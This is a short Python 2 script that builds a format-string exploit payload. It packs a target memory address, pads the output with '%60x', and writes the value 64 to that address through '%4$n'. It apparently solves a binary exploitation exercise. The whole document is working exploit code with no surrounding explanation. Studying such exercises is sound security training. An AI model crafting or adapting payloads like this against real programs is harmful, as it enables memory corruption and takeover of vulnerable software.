import struct

# address of target
target = struct.pack("I", 0x080496e4)
# offset to create value 64
offset = "%60x"
# write to target (above)
write = "%4$n"

print target + offset + write
